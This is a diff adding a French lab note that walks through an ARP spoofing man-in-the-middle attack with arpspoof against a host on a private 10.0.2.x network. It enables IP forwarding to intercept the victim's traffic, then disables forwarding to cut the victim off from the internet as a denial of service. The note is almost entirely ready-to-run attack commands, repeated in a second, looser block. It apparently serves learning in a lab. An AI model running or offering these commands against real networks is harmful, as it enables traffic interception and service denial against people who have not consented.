@@ -1,0 +1,50 @@
+
+Usurpation de MAC addr (man in the middle)
+
+* Local:
+$ route -n
+$ ifconfig -a
+$ sudo su
+# echo "1" > /proc/sys/net/ipv4/ip_forward
+>>> autorise l'ip forwarding
+
+* Distant:
+$ arp -a
+
+* Local:
+$ sudo arpspoof -i eth0 -t 10.0.2.4 -r 10.0.2.1
+
+* Distant:
+$ arp -a
+>>> tout est redirigé vers la machine local.
+
+* Local:
+$ sudo su
+# echo "0" > /proc/sys/net/ipv4/ip_forward
+>>> empèche l'ip forwarding
+$ sudo arpspoof -i eth0 -t 10.0.2.4 -r 10.0.2.1
+
+La machine distante a subi une attaque de DDoS et n'accède plus à intenet.
+
+* Local:
+Ctrl-C dans arpspoof pour remettre la bonne table ARP.
+>>> Ouf, attack ended ;) !
+
+>@#########################################################################
+>@$ sudo echo "1" > /proc/sys/net/ipv4/ip_forward
+>@>>> autorise l'ip forwarding
+>@
+>@* Local:
+>@$ sudo arpspoof -i eth0 -t 10.0.2.4 -r 10.0.2.1
+>@>@Le ARP spoof est en marche.
+>@
+>@$ arp -a
+>@
+>@>>> On verifie la table arp sur la amchine distante
+>@> sudo echo "0" > /proc/sys/net/ipv4/ip_forward
+>@>>> empeche l'ip forwarding
+>@
+>@$ sudo arpspoof -i eth0 -t 10.0.2.4 -r 10.0.2.1
+>@>@Le ARP spoof est en marche.
+>@>>> Le DoS est en marche.
+>@#########################################################################
